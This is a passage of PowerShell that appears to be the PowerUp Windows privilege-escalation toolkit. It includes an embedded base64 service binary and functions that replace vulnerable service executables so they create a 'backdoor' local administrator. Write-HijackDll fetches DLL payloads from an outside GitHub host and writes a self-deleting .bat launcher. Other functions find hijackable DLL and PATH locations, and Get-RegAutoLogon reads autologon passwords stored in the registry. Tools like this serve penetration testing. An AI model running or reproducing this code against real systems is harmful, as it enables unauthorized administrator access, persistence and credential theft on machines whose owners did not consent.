AAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAA9jAG0AZAAuAGUAeABlAABwlQEkfW6TS5S/gwmLKZ5MAAiwP19/EdUKOgi3elxWGTTgiQMGEg0EIAEBAgMgAAEFIAEBHQ4DAAABBCABAQ4FIAEBEUkEIAEBCAMgAA4GAAISYQ4OBAABAQgDBwEOBgABAR0SBQgHAh0SBR0SBQwBAAdVcGRhdGVyAAAFAQAAA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"
        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)
    }

    process {
        if(-not $Command) {
            if($UserName.Contains("\")) {
                # adding a domain user to the local group, no creation
                $Command = "net localgroup $LocalGroup $UserName /add"
            }
            else {
                # creating a local user and adding to the local group
                $Command = "net user $UserName $Password /add && timeout /t 2 && net localgroup $LocalGroup $UserName /add"
            }
        }

        # get the unicode byte conversions of all arguments
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($ServiceName)
        $CommandBytes = $Enc.GetBytes($Command)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) { 
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        try {
            Set-Content -Value $Binary -Encoding Byte -Path $ServicePath -Force
        }
        catch {
            $Msg = "Error while writing to location '$ServicePath': $_"
            Write-Warning $Msg
            $Command = $Msg
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'Command' $Command
        $Out
    }
}


function Install-ServiceBinary {
<#
    .SYNOPSIS

        Users Write-ServiceBinary to write a C# service that creates a local UserName
        and adds it to specified LocalGroup or executes a custom command.
        Domain users are only added to the specified LocalGroup.

    .PARAMETER ServiceName

        The service name to manipulate. Required.

    .PARAMETER UserName

        The [DOMAIN\username] to add, defaults to 'john'.

    .PARAMETER Password

        The password to set for the added user, default to 'Password123!'.

    .PARAMETER LocalGroup

        Local group to add the user to, defaults to 'Administrators'.

    .PARAMETER Command

        A custom command to execute.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC

        Replaces the binary for VulnSVC with one that adds a local administrator
        to the local directory. Also backs up the original service binary.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"

        Replaces the binary for VulnSVC with one that adds TESTLAB\john to the local
        administrators to the local directory. Also backs up the original service binary.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!

        Replaces the binary for VulnSVC with one that adds a local administrator of
        name 'backdoor' with password 'Password123!' to the local directory.
        Also backs up the original service binary.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."

        Replaces the binary for VulnSVC with one that executes a local command
        to the local directory. Also backs up the original service binary.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService){
            try {

                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
                $BackupPath = $ServicePath + ".bak"

                Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
                try {
                    Move-Item -Path $ServicePath -Destination $BackupPath -Force
                }
                catch {
                    Write-Warning "[*] Original path '$ServicePath' for '$ServiceName' does not exist!"
                }

                $Arguments = @{
                    'ServiceName' = $ServiceName
                    'ServicePath' = $ServicePath
                    'UserName' = $UserName
                    'Password' = $Password
                    'LocalGroup' = $LocalGroup
                    'Command' = $Command
                }
                # splat the appropriate arguments to Write-ServiceBinary
                $Result = Write-ServiceBinary @Arguments
                $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Result
            }
            catch {
                Write-Warning "Error: $_"
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
                $Out | Add-Member Noteproperty 'Command' $_
                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Out
            }
        }
        else{
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
            $Out | Add-Member Noteproperty 'Command' "Not found"
            $Out | Add-Member Noteproperty 'BackupPath' $Null
            $Out
        }
    }
}


function Restore-ServiceBinary {
<#
    .SYNOPSIS

        Copies in the backup executable to the original binary path for a service.

    .PARAMETER ServiceName

        The service name to manipulate. Required.
  
    .PARAMETER BackupPath

        Optional manual path to the backup binary.
        
    .EXAMPLE

        PS C:\> Restore-ServiceBinary -ServiceName VulnSVC

        Restore the original binary for the service 'VulnSVC'
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $BackupPath
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService){
            try {

                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")

                if ($BackupPath -eq $null -or $BackupPath -eq ''){
                    $BackupPath = $ServicePath + ".bak"
                }

                Copy-Item -Path $BackupPath -Destination $ServicePath -Force
                Remove-Item -Path $BackupPath -Force

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Out
            }
            catch{
                Write-Warning "Error: $_"
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $_
                $Out | Add-Member Noteproperty 'BackupPath' $Null
                $Out
            }
        }
        else{
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
            $Out | Add-Member Noteproperty 'BackupPath' $Null
            $Out
        }
    }
}


########################################################
#
# .dll Hijacking
#
########################################################

function Find-DLLHijack {
<#
    .SYNOPSIS

        Checks all loaded modules for each process and returns locations 
        where a loaded module does not exist in the executable base path.

    .PARAMETER ExcludeWindows

        Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*

    .PARAMETER ExcludeProgramFiles

        Exclude paths from C:\Program Files\* and C:\Program Files (x86)\* 

    .PARAMETER ExcludeOwned

        Exclude processes the current user owns. 

    .EXAMPLE

        PS C:\> Find-DLLHijack

        Finds all hijackable DLL locations.

    .EXAMPLE

        PS C:\> Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles

        Finds all hijackable DLL locations not in C:\Windows\* and
        not in C:\Program Files\* or C:\Program Files (x86)\*

    .EXAMPLE

        PS C:\> Find-DLLHijack -ExcludeOwned

        Finds .DLL hijacking opportunities for processes not owned by the
        current user.

    .LINK

        https://www.mandiant.com/blog/malware-persistence-windows-registry/
#>

    [CmdletBinding()]
    Param(
        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # the known DLL cache to exclude from our findings
    #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
    $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
    $KnownDLLs = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name) }) | Where-Object { $_.EndsWith(".dll") }

    # grab the current user
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    # get the owners for all processes
    $Owners = @{}
    Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$Owners[$_.handle] = $_.getowner().user}


    # iterate through all current processes that have a valid path
    ForEach ($Process in Get-Process | Where-Object {$_.Path}) {

        # get the base path for the process
        $BasePath = $Process.Path | Split-Path -Parent

        # get all the loaded modules for this process
        $LoadedModules = $Process.Modules

        # pull out the owner of this process
        $ProcessOwner = $Owners[$Process.id.tostring()]

        # check each loaded module
        ForEach ($Module in $LoadedModules){

            # create a basepath + loaded module
            $ModulePath = "$BasePath\$($module.ModuleName)"

            # if the new module path 
            if ((-not $ModulePath.Contains("C:\Windows\System32")) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                $Exclude = $False

                # check exclusion flags
                if ( $ExcludeWindows.IsPresent -and $ModulePath.Contains("C:\Windows") ){
                    $Exclude = $True
                }
                if ( $ExcludeProgramFiles.IsPresent -and $ModulePath.Contains("C:\Program Files") ){
                    $Exclude = $True
                }
                if ( $ExcludeOwned.IsPresent -and $CurrentUser.Contains($ProcessOwner) ){
                    $Exclude = $True
                }

                # output the process name and hijackable path if exclusion wasn't marked
                if (-not $Exclude){
                    $Out = New-Object PSObject 
                    $Out | Add-Member Noteproperty 'ProcessPath' $Process.Path
                    $Out | Add-Member Noteproperty 'Owner' $ProcessOwner
                    $Out | Add-Member Noteproperty 'HijackablePath' $ModulePath
                    $Out
                }
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


function Find-PathHijack {
<#
    .SYNOPSIS

        Checks if the current %PATH% has any directories that are 
        writeable by the current user.

    .EXAMPLE

        PS C:\> Find-PathHijack

        Finds all %PATH% .DLL hijacking opportunities.

    .LINK

        http://www.greyhathacker.net/?p=738
#>

    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Paths = (Get-Item Env:Path).value.split(';') | Where-Object {$_ -ne ""}

    ForEach ($Path in $Paths){

        $Path = $Path.Replace('"',"")
        if (-not $Path.EndsWith("\")){
            $Path = $Path + "\"
        }

        # reference - http://stackoverflow.com/questions/9735449/how-to-verify-whether-the-share-has-write-access
        $TestPath = Join-Path $Path ([IO.Path]::GetRandomFileName())

        # if the path doesn't exist, try to create the folder before testing it for write
        if(-not $(Test-Path -Path $Path)){
            try {
                # try to create the folder
                $Null = New-Item -ItemType directory -Path $Path
                echo $Null > $TestPath

                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'HijackablePath' $Path
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                $Out
            }
            catch {}
            finally {
                # remove the directory
                Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        else{
            # if the folder already exists
            try {
                echo $Null > $TestPath

                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'HijackablePath' $Path
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                $Out
            }
            catch {} 
            finally {
                # Try to remove the item again just to be safe
                Remove-Item $TestPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    
    $ErrorActionPreference = $OrigError
}


function Write-HijackDll {
<#
    .SYNOPSIS

        Writes out a self-deleting 'debug.bat' file that executes a given command to
        $env:Temp\debug.bat, and writes out a hijackable .dll that launches the .bat.

    .PARAMETER OutputFile

        File name to write the .dll to.

    .PARAMETER Command

        Command to run in the .bat launcher.

    .PARAMETER BatPath

        Path to the .bat for the .dll to launch.

    .PARAMETER Arch

        Architeture of .dll to generate, x86 or x64. If not specified, will try to
        automatically determine.
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $OutputFile,

        [Parameter(Mandatory = $True)]
        [String]
        $Command,

        [String]
        $BatPath,        

        [String]
        $Arch
    )

    function local:Invoke-PatchDll {
    <#
        .SYNOPSIS

            Patches a string in a binary byte array.

        .PARAMETER DllBytes

            Binary blog to patch.

        .PARAMETER FindString

            String to search for to replace.

        .PARAMETER ReplaceString

            String to replace FindString with
    #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [String]
            $FindString,

            [Parameter(Mandatory = $True)]
            [String]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($FindString)

        if($Index -eq 0)
        {
            throw("Could not find string $FindString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    # generate with base64 -w 0 hijack32.dll > hijack32.b64
    $DllBytes32 = (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/powerup/master/b64-32")
    $DllBytes64 = (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/powerup/master/b64-64")

    if($Arch) {
        if($Arch -eq "x64") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
        }
        elseif($Arch -eq "x86") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
        }
        else{
            Throw "Please specify x86 or x64 for the -Arch"
        }
    }
    else {
        # if no architecture if specified, try to auto-determine the arch
        if ($Env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
            $Arch = "x64"
        }
        else {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
            $Arch = "x86"
        }
    }

    if(!$BatPath) {
        $parts = $OutputFile.split("\")
        $BatPath = ($parts[0..$($parts.length-2)] -join "\") + "\debug.bat"
    }
    else {
        # patch in the appropriate .bat launcher path
        $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString "debug.bat" -ReplaceString $BatPath
    }

    # build the launcher .bat
    if (Test-Path $BatPath) { Remove-Item -Force $BatPath }
    "@echo off\n" | Out-File -Encoding ASCII -Append $BatPath 
    "start /b $Command" | Out-File -Encoding ASCII -Append $BatPath 
    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatPath
    
    ".bat launcher written to: $BatPath"

    Set-Content -Value $DllBytes -Encoding Byte -Path $OutputFile
    "$Arch DLL Hijacker written to: $OutputFile"

    $Out = New-Object PSObject 
    $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
    $Out | Add-Member Noteproperty 'Architecture' $Arch
    $Out | Add-Member Noteproperty 'BATLauncherPath' $BatPath
    $Out | Add-Member Noteproperty 'Command' $Command
    $Out
}


########################################################
#
# Registry Checks
#
########################################################

function Get-RegAlwaysInstallElevated {
<#
    .SYNOPSIS

        Checks if the AlwaysInstallElevated registry key is set.
        This meains that MSI files are always run with SYSTEM
        level privileges.

    .EXAMPLE

        PS C:\> Get-RegAlwaysInstallElevated

        Checks if the AlwaysInstallElevated registry key is set.
#>

    [CmdletBinding()]
    Param()
    
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "hkcu:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $False
        }
    }
    else{
        Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-RegAutoLogon {
<#
    .SYNOPSIS

        Checks for DefaultUserName/DefaultPassword in the Winlogin registry section 
        if the AutoAdminLogon key is set.

    .EXAMPLE

        PS C:\> Get-RegAutoLogon
        Finds any autologon credentials left in the registry.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
#>

    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon.AutoAdminLogon -ne 0){

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
